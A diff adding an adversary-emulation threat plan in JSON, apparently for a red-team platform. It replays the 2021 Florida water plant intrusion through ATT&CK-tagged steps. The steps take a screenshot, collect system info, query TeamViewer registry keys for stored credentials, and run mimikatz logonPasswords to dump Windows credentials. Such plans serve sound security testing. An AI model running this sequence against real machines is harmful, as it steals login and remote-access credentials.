@@ -1,0 +1,137 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Florida water plant attack in February 2021 where the attacker obtained access through TeamViewer. This plan exposes TeamViewer credential through a variety of procedures",
+        "display_name": "FloridaWater",
+        "name": "FloridaWater",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "printscr",
+                "request": "--load printscr",
+                "type": "message"
+            },
+            "2": {
+                "module": "printscr",
+                "request": "--window Desktop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1113"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "sysinfo",
+                "request": "--load sysinfo",
+                "type": "message"
+            },
+            "4": {
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "6": {
+                "function": "ifelse",
+                "next": 12,
+                "step": 5,
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "8": {
+                "module": "upsh",
+                "request": "--cmd Get-ItemProperty -Path HKLM:\\SOFTWARE\\WOW6432Node\\TeamViewer",
+                "rtags": [
+                    "att&ck-technique:T1528"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "module": "loader",
+                "module_to_load": "mimikatz",
+                "request": "--load mimikatz",
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "acc295cf-e232-4a4d-9210-1a6911beb4f8",
+                "module": "mimikatz",
+                "request": "--arglist sekurlsa::logonPasswords",
+                "rtags": [
+                    "att&ck-technique:T1003"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "function": "ifelse",
+                "next": 15,
+                "step": 10,
+                "type": "decision",
+                "value": "mimikatz",
+                "verb": "contains"
+            },
+            "12": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query HKEY_CURRENT_USER\\SOFTWARE\\TeamViewer",
+                "rtags": [
+                    "att&ck-technique:T1552.002"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query HKEY_CURRENT_USER\\SOFTWARE\\TeamViewer\\MachineFallback",
+                "rtags": [
+                    "att&ck-technique:T1528"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
